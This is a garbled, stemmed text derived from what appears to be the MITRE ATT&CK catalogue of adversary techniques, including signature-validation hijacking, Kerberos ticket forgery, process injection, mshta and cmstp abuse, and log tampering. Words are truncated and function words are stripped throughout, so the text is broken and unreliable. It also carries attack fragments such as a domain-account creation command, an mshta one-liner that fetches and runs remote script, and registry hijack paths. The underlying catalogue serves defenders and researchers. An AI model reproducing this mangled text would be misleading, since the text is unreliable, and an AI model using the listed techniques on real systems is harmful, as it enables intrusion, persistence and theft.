us mod window authenticod microsoft authenticod digit sign us ver fil origin integr vary us est trust sign cod ex driv valid microsoft sign handl saf sign valid process handl via winverifytrust apply program interfac ap funct microsoft winverifytrust acceiv inquiry coordin appropry trust provid respons valid paramet sign spectorop subvert trust sept 2017 vary execut fil typ correspond sign form microsoft cre softw compon cal subject interfac pack sip eduardosblog sip july 2008 provid lay abstract ap funct fil sip respons en ap funct cre retriev calc ver sign un sip ex fil form execut powershel instal etc. catalog sign provid catch-all microsoft catalog fil sign april 2017 ident glob un ident guid spectorop subvert trust sept 2017 simil cod sign http advers abus architect subvert trust control bypass sec policy allow legitim sign cod execut system advers hijack sip trust provid compon mislead op system whitel tool class malicy cod sign spectorop subvert trust sept 2017 mod < cod > dll < /code > < cod > funcnam < /code > reg valu < cod > hklm\software \wow6432node\ microsoft\cryptography\oid\encodingtype 0\cryptsipdllgetsigneddatamsg\ sip_guid < /code > point dynam link libr dll provid sip ’ cryptsipdllgetsigneddatamsg funct retriev encod digit cert sign fil point maliciously-crafted dll export funct alway return know good sign valu ex microsoft sign port execut rath fil ’ real sign advers apply acceiv sign valu fil us sip github sip poc sept 2017 although hash mismatch lik occ invalid sign sint hash return funct match valu comput fil mod < cod > dll < /code > < cod > funcnam < /code > reg valu < cod > hklm\software\ wow6432node\ microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata\ sip_guid < /code > point dll provid sip ’ cryptsipdllverifyindirectdat funct valid fil ’ comput hash sign hash valu point maliciously-crafted dll export funct alway return tru ind valid success advers success valid fil legitim sign us sip github sip poc sept 2017 without hijack prevy ment cryptsipdllgetsigneddatamsg funct reg valu could also redirect suit export funct already pres dll avoid requir drop execut new fil disk mod < cod > dll < /code > < cod > funct < /code > reg valu < cod > hklm\software\ wow6432node\ microsoft\cryptography\providers\trust\finalpolicy\ trust provid guid < /code > point dll provid trust provid ’ finalpolicy funct decod pars sign check maj trust decid mak simil hijack sip ’ cryptsipdllverifyindirectdat funct valu redirect suit export funct already pres dll maliciously-crafted dll though impl trust provid complex not hijack also poss without mod reg via dll search ord hijack http hijack sip trust provid compon also en persist cod execut sint malicy compon invok apply perform cod sign sign valid spectorop subvert trust sept 2017
account discovery
advers attempt get list account system within environ inform help advers determin account ex aid follow-on behavy
proxy
advers us connect proxy direct network traff system act intermedy network commun command control serv avoid direct connect infrastruct many tool ex en traff redirect proxy port redirect includ htran http zxproxy zxportmap trend micro apt attack tool advers us typ proxy man command control commun reduc numb simult outbound network connect provid resy fac connect loss rid ex trust commun path victim avoid susp advers chain togeth multipl proxy disgu sourc malicy traff advers also tak adv rout scheme cont delivery network cdns proxy command control traff
command script interpret
advers abus command script interpret execut command script bin interfac langu provid way interact comput system common feat across many diff platform system com built-in command-line interfac script cap exampl maco linux distribut includ flav unix shel http window instal includ window command shel http powershel http also cross-platform interpret python http wel common assocy cli apply javascrib http vis bas http advers abus technolog vary way mean execut arbit command command script emb init access http payload del victim lur docu second payload download ex c2 advers also execut command interact terminals/shell wel util vary remot serv http ord achiev remot execut powershel remot command cisco io softw integr ass - command hist remot shel execut python
ind block
advers attempt block ind ev typ capt sens gath analys could includ malicy redirect microsoft lamin sept 2017 ev dis host-based sens ev trac window etw microsoft ev trac 2018 tamp set control collect flow ev telemetry med ev trac tamp 2018 set stor system config fil and/or reg wel access via admin util powershel http window man instru http etw interrupt achiev multipl way howev direct defin condit us powershel http < cod > set-etwtraceprovider < /code > cmdlet interfac direct reg mak alt cas network-based report ind advers block traff assocy report prev cent analys accompl many mean stop loc process respons forward telemetry and/or cre host-based firewal rul block traff spec host respons aggreg ev sec inform ev man siem produc linux environ advers dis reconfig log process tool syslog nxlog inhibit detect monit cap facilit follow behavy lemonduck
domain account
advers cre domain account maintain access victim system domain account man act direct domain serv access permit config across system serv part domain domain account cov us admin serv account sufficy level access < cod > net us /add /domain < /code > command us cre domain account account us est second cred access requir persist remot access tool deploy system
employ nam
advers gath employ nam us target employ nam us der email address wel help guid reconnaiss effort and/or craft more-believabl lur advers easy gath employ nam sint ready avail expos via onlin access dat set ex soc med http search victim-owned websit http opm leak gath inform rev opportun form reconnaiss ex search op websites/domain http phish inform http est op resourc ex comprom account http and/or init access ex phish http valid account http
domain trust discovery
advers attempt gath inform domain trust rel us ident lat mov opportun window multi-domain/forest environ domain trust provid mech domain allow access resourc bas auth proc anoth domain microsoft trust domain trust allow us trust domain access resourc trust domain inform discov help advers conduc sid-history inject http pas ticket http kerberoast http adsec forg trust ticket harmj0y domain trust domain trust enum us ` dsenumeratedomaintrust ` win32 ap cal .net method ldap harmj0y domain trust window util nltest http know us advers enum domain trust microsoft op wilysupply
gold ticket
advers krbtgt account password hash forg kerbero ticket-granting ticket tgt also know gold ticket adsec kerbero gt aug 2015 gold ticket en advers gen auth mat account act direct cert-eu gold ticket protect us gold ticket advers abl request ticket grant serv tgs ticket en access spec resourc gold ticket requir advers interact key distribut cent kdc ord obtain tgs adsec detect forg ticket kdc serv run domain control part act direct domain krbtgt kerbero key distribut cent kdc serv account respons encrypt sign kerbero ticket adsec kerbero krbtgt krbtgt password hash obtain us o cred dump http privileg access domain control
compon object model distribut com
techn deprec pleas us distribut compon object model http compon object model http advers us window compon object model com distribut compon object model dcom loc cod execut execut remot system part lat mov com compon nat window apply program interfac ap en interact softw object execut cod impl on interfac fireey hunt com jun 2019 com cli object cal method serv object typ dynam link libr dll execut ex microsoft com dcom transp middlew extend funct compon object model com microsoft com beyond loc comput us remot proc cal rpc technolog fireey hunt com jun 2019 permit interact loc remot serv com object spec access control list ac reg microsoft com ac microsoft process wid com key microsoft system wid com key default admin remot act launch com object dcom advers abus com loc command and/or payload execut vary com interfac expos abus invok arbit execut via vary program langu c c++ jav vbscript microsoft com spec com object also ex direct perform funct beyond cod execut cre schedule task/job http fileless download/execution advers behavy privileg esc persist fireey hunt com jun 2019 projectzero fil writ eop apr 2018 advers us dcom lat mov dcom advers op context appropry privileg us remot obtain arbit ev direct shellcod execut off apply enigm outlook dcom lat mov nov 2017 wel window object contain insec method enigm mmc20 com jan 2017 enigm dcom lat mov jan 2017 dcom also execut macro ex docu enigm excel dcom sept 2017 also invok dynam dat exchang http dde execut direct com cre inst microsoft off apply cyberreason dcom dde lat mov nov 2017 bypass nee malicy docu
autom exfilt
advers exfilt dat sensit docu us autom process gath collect autom exfilt us exfilt techn lik apply wel transf inform network exfilt c2 channel http exfilt altern protocol http
cli config
advers gath inform victim cli config us target inform cli config includ vary detail set includ op system/version virt architect ex 32 64 bit langu and/or tim zon advers gath inform vary way direct collect act via act scan http ex list port serv ban us ag string phish inform http advers also comprom sit includ malicy cont design collect host inform visit scanbox inform cli config also expos advers via onlin access dat set ex job post network map assess report resum purchas invo gath inform rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex supply chain comprom http extern remot serv http
dis mod cloud firewal
advers dis mod firewal within cloud environ bypass control limit access cloud resourc cloud firewal sep system firewal describ dis mod system firewal http cloud environ typ util restrict sec group firewal rul allow network act trust ip address via expect port protocol advers introduc new firewal rul policy allow access victim cloud environ exampl advers us script util cre new ingr rul ex sec group allow tcp/ip connect expel io evil aw mod dis cloud firewal en advers c2 commun lat mov and/or dat exfilt would otherw allow
right-to-left overrid
advers abus right-to-left overrid rtlo rlo charact u+202e disgu string and/or fil nam mak appear benign rtlo non-printing unicod charact caus text follow display revers exampl window screensaver execut nam < cod > march 25 \u202excod.scr < /code > display < cod > march 25 rcs.docx < /code > javascrib fil nam < cod > photo_high_re\u202egnp.js < /code > display < cod > photo_high_resj.png < /code > infosecinstitut rtlo techn advers abus rtlo charact mean trick us execut think benign fil typ common us techn spearph attach http / malicy fil http sint trick end us defend aw tool display rend rtlo charact us rtlo charact see many target intrud attempt crimin act trend micro plead rtlo kaspersky rtlo cyb crim rtlo us window reg wel regedit.exe display revers charact command lin tool reg.exe default
malw
advers buy ste download malw us target malicy softw includ payload drop post-compromise tool backdo pack c2 protocol advers acquir malw support op obtain mean maintain control remot machin evad defens execut post-compromise behavy addit download fre malw internet advers purchas cap third-party ent third-party ent includ technolog company spec malw develop crimin marketplac includ malware-as-a-servic maa individ addit purchas malw advers ste repurpos malw third-party ent includ advers
compon firmw
advers mod compon firmw persist system advers employ soph mean comprom comput compon instal malicy firmw execut advers cod outsid op system main system firmw bio techn simil system firmw http conduc upon system components/device cap level integr check malicy compon firmw could provid persist level access system despit pot typ fail maintain access hard disk re-images wel way evad host software-based defens integr check
ind remov
advers delet mod artifact gen within system remov evid pres hind defens vary artifact cre advers someth attribut advers ’ act typ artifact us defend ind rel monit ev string download fil log gen us act dat analys defend loc form typ artifact command login hist oft spec platform remov ind interf ev collect report process us detect intrud act comprom integr sec solv caus not ev go unreport act also imp forens analys incid respons due lack sufficy dat determin occ
exfilt symmet encrypt non-c2 protocol
advers ste dat exfilt symmet encrypt network protocol ex command control channel dat also send altern network loc main command control serv symmet encrypt algorithm us shar keys/secret end channel requir exchang pre-arranged agreement/possession valu us encrypt decrypt dat network protocol us asymmet encrypt oft util symmet encrypt key exchang advers opt man shar key impl symmet cryptograph algorithm ex rc4 ae vic us mech bak protocol result multipl lay encrypt protocol nat encrypt http encrypt protocol typ encrypt http ftp
off templ macro
advers abus microsoft off templ obtain persist comprom system microsoft off contain templ part common off apply us custom styl bas templ within apply us tim apply start microsoft chang norm templ off vis bas apply vba macro msdn vba off insert bas templ us execut cod respect off apply start ord obtain persist exampl word excel discov publ default word normal.dotm templ cre mod includ malicy macro excel templ fil cre default on ad autom load enigma0x3 normal.dotm hexacorn off templ macro shar templ also stor pul remot loc globaldotnam jun 2019 word normal.dotm loc < br > < cod > c \users\ lt usernam gt \appdata\roaming\microsoft\templates\normal.dotm < /code > excel personal.xlsb loc < br > < cod > c \users\ lt usernam gt \appdata\roaming\microsoft\excel\xlstart\personal.xlsb < /code > advers also chang loc bas templ point hijack apply search ord e.g word 2016 first look normal.dotm < cod > c \program fil x86 \microsoft office\root\office16\ < /code > mod globaldotnam reg key mod globaldotnam reg key advers spec arbit loc fil nam fil extend us templ load apply startup abus globaldotnam advers first nee reg templ trust docu plac trust loc globaldotnam jun 2019 advers nee en macro execut unrestrict depend system enterpr sec policy us macro
virt priv serv
advers rent virt priv serv vpss us target ex vary cloud serv provid sel virt machines/container serv util vps advers mak difficult phys tie back op us cloud infrastruct also mak easy advers rapid provid mod shut infrastruct acquir vps us lat stag advers lifecyc command control allow advers benefit ub trust assocy high reput cloud serv provid advers also acquir infrastruct vps serv provid know rent vpss minim reg inform allow anonym acquisit infrastruct trendmicrohideoutsleas
conflu
advers lev conflu reposit min valu inform oft find develop environ alongsid atlass jir conflu gen us stor development-related docu howev gen contain divers categ us inform policy proc standard phys / log network diagram system architect diagram techn system docu test / develop cred work / project schedule sourc cod snippet link network shar intern resourc
pas ticket
advers “ pas ticket ” us ste kerbero ticket mov lat within environ bypass norm system access control pas ticket ptt method auth system us kerbero ticket without access account password kerbero auth us first step lat mov remot system preform ptt valid kerbero ticket valid account http capt o cred dump http us serv ticket ticket grant ticket tgt obtain depend level access serv ticket allow access particul resourc wherea tgt us request serv ticket ticket grant serv tgs access resourc us privileg access adsec ad kerbero attack gentilkiw pas ticket silv ticket http obtain serv us kerbero auth mech us gen ticket access particul resourc system host resourc sharepoint adsec ad kerbero attack gold ticket http obtain domain us key distribut serv account krbtgt account ntlm hash en gen tgts account act direct campbel 2014 advers also cre valid kerbero ticket us us inform ste password hash ae key exampl overpass hash involv us ntlm password hash auth us i.e pas hash http also us password hash cre valid kerbero ticket stealthbit overpass-the-hash
contain admin command
advers abus contain admin serv execut command within contain contain admin serv dock daemon kubernet ap serv kubelet allow remot man contain within environ dock daemon cli kubernet ap kubernet kubelet dock advers spec entrypoint contain deploy execut script command us command < cod > dock exec < /code > execut command within run contain dock entrypoint dock exec kubernet advers sufficy permit gain remot execut contain clust via interact kubernet ap serv kubelet run command < cod > kubectl exec < /code > kubectl exec get shel
fil direct discovery
advers enum fil direct search spec loc host network shar certain inform within fil system advers us inform fil direct discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act many command shel util us obtain inform exampl includ < cod > dir < /code > < cod > tre < /code > < cod > l < /code > < cod > find < /code > < cod > loc < /code > window command jpcert custom tool also us gath fil direct inform interact nat ap http advers also lev network dev cli http network dev gath fil direct inform e.g < cod > dir < /code > < cod > show flash < /code > and/or < cod > nvram < /code > us-cert-ta18-106a
dynam resolv
advers dynam est connect command control infrastruct evad common detect remedy achiev us malw shar common algorithm infrastruct advers us receiv malw commun calc us dynam adjust paramet domain nam ip address port numb malw us command control advers us dynam resolv purpos fallback channel http contact los prim command control serv malw employ dynam resolv mean reest command control talo ccleanup 2017 fireey poshspy april 2017 eset sednit 2017 act
masquerad task serv
advers attempt manip nam task serv mak appear legitim benign tasks/service execut task scheduler systemd typ giv nam and/or describ technet schtasks systemd serv unit window serv serv nam wel display nam many benign task serv ex common assocy nam advers giv task serv nam simil id legitim on task serv contain field describ advers attempt mak appear legitim palo alto shamoon nov 2016 fysb dr web analys
asynchron proc cal
advers inject malicy cod process via asynchron proc cal apc queu ord evad process-based defens wel poss elev privileg apc inject method execut arbit cod address spac sep liv process apc inject common perform attach malicy cod apc queu microsoft apc process thread queu apc funct execut thread ent alt stat microsoft apc handl ex victim process first cre nat window ap cal < cod > openthread < /code > point < cod > queueuserapc < /code > us invok funct < cod > loadlibray < /code > point malicy dll vary apc inject dub ear bird inject involv cre suspend process malicy cod writ execut process ' entry point pot subsequ anti-malware hook via apc cyberbit ear bird apr 2018 atombomb ensil atombomb oct 2016 anoth vary util apc invok malicy cod prevy writ glob atom tabl microsoft atom tabl run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via apc inject also evad detect sec produc sint execut mask legitim process
traff duply
advers lev traff mir ord autom dat exfilt comprom network infrastruct traff mir nat feat network dev us network analys config duply traff forward on destin analys network analys monit dev cisco traff mir junip traff mir advers abus traff mir mir redirect network traff network infrastruct control malicy mod network dev en traff redirect poss rommonkit http patch system im http us-cert-ta18-106a cisco blog leg dev attack advers us traff duply conjunct network sniff http input capt http adversary-in-the-middle http depend goal object advers
apply shim
microsoft window apply compat infrastructure/framework apply shim cre allow backward compat softw op system codebas chang tim exampl apply shim feat allow develop apply fix apply without rewrit cod cre window xp work window 10 elast process inject july 2017 within framework shim cre act buff program spec import address tabl window o program execut shim cach ref determin program requir us shim databas .sdb shim databas us hook http redirect cod necess ord commun o list shim cur inst default window instal sdbinst.exe keep < cod > windir \apppatch\sysmain.sdb < /code > < cod > hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb < /code > custom databas stor < cod > windir \apppatch\custom windir \apppatch\apppatch64\custom < /code > < cod > hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom < /code > keep shim sec window design run us mod mod kernel must admin privileg instal shim howev certain shim us bypass us account control http uac redirectex inject dlls process injectdl dis dat execut prev disablenx structure exceiv handl disableseh interceiv mem address getprocaddress simil hook http util shim allow advers perform sev malicy act elev privileg instal backdo dis defens lik window defend etc
plist fil mod
advers mod property list fil plist fil en malicy act also pot evad bypass system defens maco apply us plist fil < cod > info.plist < /code > fil stor property config set inform op system handl apply runtim plist fil structure metadat key-value pair form xml bas appl cor found dtd plist fil sav text bin form fileinfo plist fil describ advers mod key-value pair plist fil influ system behavy hid execut apply i.e hid window http run addit command persist ex launch ag http / launch daemon http re-opened apply http exampl advers ad malicy apply path ` ~/library/preferences/com.apple.dock.plist ` fil control ap appear dock advers also mod < cod > lsuiel < /code > key apply ’ < cod > info.plist < /code > fil run ap background advers also insert key-value pair insert environ vary < cod > lsenviron < /code > en persist via dynam link hijack http wardl chp2 persist eset_osx_flashback
appcert dlls
advers est persist and/or elev privileg execut malicy cont trig appcert dlls load process dynamic-link libr dlls spec < cod > appcertdl < /code > reg key < cod > hkey_local_machine\system\currentcontrolset\control\session manager\ < /code > load every process cal ubiquit us apply program interfac ap funct < cod > createprocess < /code > < cod > createprocessasus < /code > < cod > createprocesswithloginw < /code > < cod > createprocesswithtokenw < /code > < cod > winexec < /code > elast process inject july 2017 simil process inject http valu abus obtain elev privileg caus malicy dll load run context sep process comput malicy appcert dlls also provid persist continu trig ap act
cmstp
microsoft connect man profil instal cmstp.exe command-line program us instal connect man serv profil microsoft connect man oct 2009 cmstp.exe acceiv instal inform fil inf paramet instal serv profil lev remot access connect advers supply cmstp.exe inf fil infect malicy command twit cmstp us jan 2018 simil regsvr32 http / ” squiblydoo ” cmstp.exe abus load execut dlls msitpro cmstp aug 2017 and/or com scriptlets sct remot serv twit cmstp jan 2018 github ultim applock bypass list end cmstp july 2018 execut also bypass applock whitel defens sint cmstp.exe legitim sign microsoft apply cmstp.exe also abus bypass us account control http execut arbit command malicy inf auto-elevated com interfac msitpro cmstp aug 2017 github ultim applock bypass list end cmstp july 2018
multi-hop proxy
disgu sourc malicy traff advers chain togeth multipl proxy typ defend abl ident last proxy traff travers ent network defend abl ident prevy proxy last-hop proxy techn mak ident origin sourc malicy traff ev difficult requir defend trac malicy traff sev proxy ident sourc
email forward rul
advers setup email forward rul collect sensit inform advers abus email-forwarding rul monit act victim ste inform gain intellig victim victim ’ org us part exploit op us-cert ta18-068 2018 furtherm email forward rul allow advers maintain persist access victim email ev comprom cred reset admin pfammat - hid inbox rul email cli allow us cre inbox rul vary email funct includ forward diff recipy rul cre loc email apply web interfac command-line interfac mess forward intern extern recipy restrict limit ext rul admin also cre forward rul us account consid outcom microsoft tim mcmichael exchang mail forward 2 mac forward rul us admin within org advers valid cred cre rul autom forward receiv mess anoth recipy forward email diff loc bas send advers also hid rul mak us microsoft mess ap map mod rul property mak hid vis outlook ow exchang admin tool pfammat - hid inbox rul
dat stag
advers stag collect dat cent loc direct pri exfilt dat keep sep fil combin on fil techn arch collect dat http interact command shel us common funct within cmd http bash us cop dat stag loc pwc cloud hop april 2017 cloud environ advers stag dat within particul inst virt machin exfilt advers cre cloud inst http stag dat inst mandy m-trends 2020 advers choos stag dat victim network cent loc pri exfilt minim numb connect mak c2 serv bet evad detect
ste forg auth cert
advers ste forg cert us auth access remot system resourc digit cert oft us sign encrypt mess and/or fil cert also us auth mat exampl az ad dev cert act direct cert serv ad c cert bind id us cred domain account o365 blog az ad dev id microsoft ad c overview auth cert ste forg exampl ad c cert ste encrypt stor reg fil misplac cert fil i.e unsec cred http direct window cert stor via vary crypto ap specterop cert pre own github certst github ghostpack cert appropry enrol right us and/or machin within domain also request and/or man renew cert enterpr cert auth ca enrol process defin vary set permit assocy cert not cert ’ extend key us eku valu defin sign encrypt auth us cas cert ’ subject altern nam san valu defin cert own ’ altern nam med cert pre own abus cert auth cred en behavy lat mov http certificate-related misconfig also en opportun privileg esc http way allow us imperson assum privileg account permit via id san assocy cert abus also en persist http via ste forg cert us valid account http dur cert valid despit us password reset auth cert also ste forg machin account advers access root subordin ca cert priv key mech protecting/man key also est persist http forg arbit auth cert victim domain know “ gold ” cert med cert pre own advers also target cert rel serv ord access form cred gold ticket http ticket-granting ticket tgt ntlm plaintext med cert pre own
dev reg
advers reg dev adversary-controlled account dev reg multifact auth mfa system handl auth network dev man system handl dev access comply mfa system duo okt allow us assocy dev account ord complet mfa requir advers comprom us ’ cred enrol new dev ord bypass init mfa requir gain persist access network cis mfa printnightm darkread fireey solarwind simil advers ex access network reg dev az ad and/or dev man system microsoft intun ord access sensit dat resourc bypass condit access policy aadintern - dev reg aadintern - condit access bypass microsoft dev-0537 dev reg az ad abl conduc intern spearph http campaign via intra-organizational email le lik tre suspicy email cli microsoft - dev reg addit advers abl perform serv exhaust flood http az ad ten reg larg numb dev aadintern - bprt
system network connect discovery
advers attempt get list network connect comprom system cur access remot system query inform network advers gain access system part cloud-bas environ map virt priv cloud virt network ord determin system serv connect act perform lik typ discovery techn depend op system result inform includ detail network cloud environ relev advers goal cloud provid diff way virt network op amazon aw vpc guid microsoft az virt network overview googl vpc overview simil advers gain access network dev also perform simil discovery act gath inform connect system serv util command acquir inform includ netst http net us net sess net http mac linux netst http < cod > lsof < /code > us list cur connect < cod > -a < /code > < cod > w < /code > us show us cur log simil net sess addit built-in feat nat network dev network dev cli http us e.g < cod > show ip socket < /code > < cod > show tcp brief < /code > us-cert-ta18-106a
comprom infrastruct
advers comprom third-party infrastruct us target infrastruct solv includ phys cloud serv domain third-party web dns serv instead buy leas rent infrastruct advers comprom infrastruct us phas advers lifecyc mandy apt1 icanndomainnamehijack talo dnspionage nov 2018 fireey ep awak part 2 addit advers comprom num machin form botnet lev us comprom infrastruct allow advers stag launch execut op comprom infrastruct help advers op blend traff see norm contact high reput trust sit exampl advers lev comprom infrastruct pot also conjunct digit cert http blend support stag inform gath and/or phish http campaign fireey dns hijack 2019 us comprom infrastruct advers mak difficult tie act back pri target advers comprom infrastruct advers nsa ncsc turl oilrig
mark-of-the-web bypass
advers abus spec fil form subvert mark-of-the-web motw control window fil download internet tag hid ntfs altern dat stream ad nam < cod > zone.identifier < /code > spec valu know motw microsoft zone.identifier 2020 fil tag motw protect perform certain act exampl start m off 10 m off fil motw op protect view execut tag motw process window defend smartscreen comp fil allowl well-known execut fil known/trusted smartscreen prev execut warn us run beek us vhd dec 2020 outflank motw 2020 intez russ apt dec 2020 advers abus contain fil compressed/archive .arj .gzip and/or disk im .iso .vhd fil form del malicy payload tag motw contain fil download internet mark motw fil within inherit motw contain fil extract and/or mount motw ntfs feat many contain fil support ntfs altern dat stream contain fil extract and/or mount fil contain within tre loc fil disk run without protect beek us vhd dec 2020 outflank motw 2020
dis crypto hardw
advers dis network dev ’ ded hardw encrypt en lev weak softw encrypt ord reduc effort involv collect manip exfilt transmit dat many network dev rout switch firewal perform encrypt network traff sec transmit across network oft dev equip spec ded encrypt hardw gre increas spee encrypt process wel prev malicy tamp advers tak control dev dis ded hardw exampl us mod system im http forc us softw perform encrypt gen process typ us conjunct attack weak strength ciph softw reduc key spac http cisco blog leg dev attack
pre-os boot
advers abus pre-os boot mech way est persist system boot process comput firmw vary startup serv load op system program control flow execut op system tak control wikiped boot advers overwrit dat boot driv firmw bio bas input/output system un extens firmw interfac uef persist system lay op system particul difficult detect malw level detect host software-based defens
script
techn deprec pleas us command script interpret http appropry advers us script aid op perform multipl act would otherw man script us spee op task reduc tim requir gain access crit resourc script langu us bypass process monit mech direct interact op system ap level instead cal program common script langu window includ vbscript powershel http could also form command-line batch script script emb insid off docu macro set execut fil us spearph attach http typ spearph op malicy emb macro altern mean execut softw exploit exploit cli execut http advers rely macro allow us acceiv act many popul offend framework ex us form script sec test advers alik metasploit metasploit_ref veil veil_ref powersploit powersploit three exampl popul among penet test exploit post-compromise op includ many feat evad defens advers know us powershel alperovitch 2014
build im host
advers build contain im direct host bypass defens monit retriev malicy im publ reg remot < cod > build < /code > request send dock ap includ dockerfil pul vanill bas im alpin publ loc reg build custom im upon dock build im advers tak adv < cod > build < /code > ap build custom im host includ malw download c2 serv util deploy contain http us custom im aqu build im host aqu sec cloud nat threat report jun 2021 bas im pul publ reg defens lik detect im malicy sint ’ vanill im bas im already resid loc reg pul consid ev le suspicy sint im already environ
shar webroot
techn deprec long us advers ad malicy cont intern access websit op network fil shar contain websit webroot web cont direct microsoft web root oct 2016 apach serv 2018 brows cont web brows caus serv execut malicy cont malicy cont typ run context permit web serv process oft result loc system admin privileg depend web serv config mech shar access remot execut could us lat mov system run web serv exampl web serv run php op network shar could allow advers upload remot access tool php script execut rat system run web serv spec pag visit webroot php 2011
port execut inject
advers inject port execut pe process ord evad process-based defens wel poss elev privileg pe inject method execut arbit cod address spac sep liv process pe inject common perform cop cod perhap without fil disk virt address spac target process invok via new thread writ perform nat window ap cal < cod > virtualallocex < /code > < cod > writeprocessmem < /code > invok < cod > createremotethread < /code > addit cod ex shellcod displac inject cod introduc addit requir funct remap mem ref elast process inject july 2017 run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via pe inject also evad detect sec produc sint execut mask legitim process
verclsid
advers abus verclsid.exe proxy execut malicy cod verclsid.exe know extend clsid ver host respons ver shel extend us window expl window shel winosbit verclsid.exe advers abus verclsid.exe execut malicy payload achiev run < cod > verclsid.exe /s /c clsid < /code > fil ref class id clsid un id numb us ident com object com payload execut verclsid.exe abl perform vary malicy act load execut com scriptlets sct remot serv simil regsvr32 http sint bin sign and/or nat window system proxy execut via verclsid.exe bypass apply control solv account pot abus lolba verclsid red can verclsid.exe bohop abus com reg nick tyr github
comprom account
advers comprom account serv us target op incorp soc engin util onlin person import rath cre cult account i.e est account http advers comprom ex account util ex person engend level trust pot victim rel knowledg comprom person vary method ex comprom account gath cred via phish inform http purchas cred third-party sit brut forc cred ex password reus breach cred dump anonhbg pri comprom account advers conduc reconnaiss inform decid account comprom op person ex singl sit across multipl sit ex facebook linkedin twit googl etc. comprom account requir addit develop could includ fil mod profil inform develop soc network incorp photo advers direct lev comprom email account phish inform http phish http
launchctl
advers abus launchctl execut command program launchctl interfac launchd serv man framework maco launchctl support tak subcommand command-line interact ev redirect standard input launchctl man advers us launchctl execut command program launch ag http launch daemon http s. common subcommand includ < cod > launchctl load < /code > < cod > launchctl unload < /code > < cod > launchctl start < /code > advers us script man run command < cod > launchctl load -w s/library/launchagents/ < /code > < cod > /bin/launchctl load < /code > execut launch ag http launch daemon http s. sof komplex trod 20 maco common tool techn
botnet
advers comprom num third-party system form botnet us target botnet network comprom system instruct perform coordin task norton botnet instead purchasing/rent botnet booter/stress serv advers build botnet comprom num third-party system imperv ddo hir advers also conduc takeov ex botnet redirect bot adversary-controlled c2 serv del dridex oct 2015 botnet dispos advers perform follow-on act large-scal phish http distribut den serv ddo
network dev cli
advers abus script built-in command lin interpret cli network dev execut malicy command payload cli prim mean us admin interact dev ord view system inform mod dev op perform diagnost admin funct cli typ contain vary permit level requir diff command script interpret autom task extend funct beyond command set includ network o cli script interpret access direct consol connect remot mean telnet ssh http advers us network cli chang network dev behav op cli us manip traff flow interceiv manip dat mod startup config paramet load malicy system softw dis sec feat log avoid detect cisco syn knock evolv
bash hist
advers search bash command hist comprom system insec stor cred bash keep track command us typ command-line hist util us log hist flush us ’ < cod > .bash_history < /code > fil us fil resid loc < cod > ~/.bash_history < /code > typ fil keep track us ’ last 500 command us oft typ usernam password command-line paramet program get sav fil log advers abus look fil pot cred extern da o x way
downgrad attack
advers downgrad us vert system feat outd vuln and/or support upd sec control log exampl powershel http vert 5+ includ script block log sbl record execut script cont howev advers attempt execut prevy vert powershel support sbl int impair defens http run malicy script otherw detect crowdstrik bgh ransomw 2021 mandy byol 2018 att_def_ps_logging advers downgrad us less-secure vert vary feat system command script interpret http ev network protocol abus en adversary-in-the-middle http praet tl downgrad attack 2014
xpc serv
advers provid malicy cont xpc serv daemon loc cod execut maco us xpc serv bas inter-process commun vary process xpc serv daemon third-party apply privileg help tool apply send mess xpc serv daemon run root us low-level xpc serv < cod > c ap < /code > high level < cod > nsxpcconnection ap < /code > ord handl task requir elev privileg network connect apply respons provid protocol definit serf blueprint xpc serv develop typ us xpc serv provid apply stabl privileg sep apply cli daemon creatingxpcserv design daemon appl dev advers abus xpc serv execut malicy cont request malicy execut pass apply xpc serv handl cvmserver vuln learn xpc exploit also includ ident abus improp xpc cli valid and/or poor sanit input paramet conduc exploit privileg esc http
virtualization/sandbox evas
advers employ vary mean detect avoid virt analys environ includ chang behavy bas result check pres artifact ind virt machin environ vme sandbox advers detect vme alt malw diseng victim cont cor funct impl also search vme artifact drop second addit payload advers us inform learn virtualization/sandbox evas http autom discovery shap follow-on behavy deloit environ aw advers us sev method accompl virtualization/sandbox evas http check sec monit tool sysintern wireshark etc system artifact assocy analys virt advers also check legitim us act help determin analys environ addit method includ us sleep tim loop within malw cod avoid op within temp sandbox unit 42 pirp july 2015
web serv
advers us ex legitim extern web serv mean relay dat to/from comprom system popul websit soc med act mech c2 giv sign amount cov due lik host within network already commun pri comprom us common serv off googl twit mak easy advers hid expect nois web serv provid common us ssl/tls encrypt giv advers ad level protect us web serv also protect back-end c2 infrastruct discovery malw bin analys also en op resy sint infrastruct dynam chang
cred fil
advers search loc fil system remot fil shar fil contain insec stor cred fil cre us stor cred shar cred stor group individ config fil contain password system serv sourc code/binary fil contain emb password poss extract password backup sav virt machin o cred dump http cg 2014 password also obtain group policy pref stor window domain control srd gpp cloud and/or contain environ auth us serv account cred oft stor loc config cred fil unit 42 hildegard malw also find paramet deploy command contain log unit 42 unsec dock daemon cas fil cop reus anoth machin cont read us auth without nee cop fil spect op - cloud cred stor
dns calc
advers perform calc address return dns result determin port ip address us command control rath rely predetermin port numb act return ip address ip and/or port numb calc us bypass egress filt c2 channel mey numb pand on impl dns calc http tak first three octet ip address dns respons us valu calc port command control traff mey numb pand mor 2014 rapid7g20espionage
mshta
advers abus mshta.exe proxy execut malicy .hta fil javascrib vbscript trust window util sev exampl diff typ threat lev mshta.exe init comprom execut cod cyl dust storm red can hta abus part deux fireey attack lev hta airb sec kovt analys fireey fin7 april 2017 mshta.exe util execut microsoft html apply hta fil wikiped html apply hta standalon apply execut us model technolog internet expl outsid brows msdn html apply fil execut mshta.exe inlin script < cod > mshta vbscript clos execut getobject script http sct < /code > also execut direct url < cod > mshta http hta < /code > mshta.exe us bypass apply control solv account pot us sint mshta.exe execut outsid internet expl sec context also bypass brows sec set lolba mshta
login item
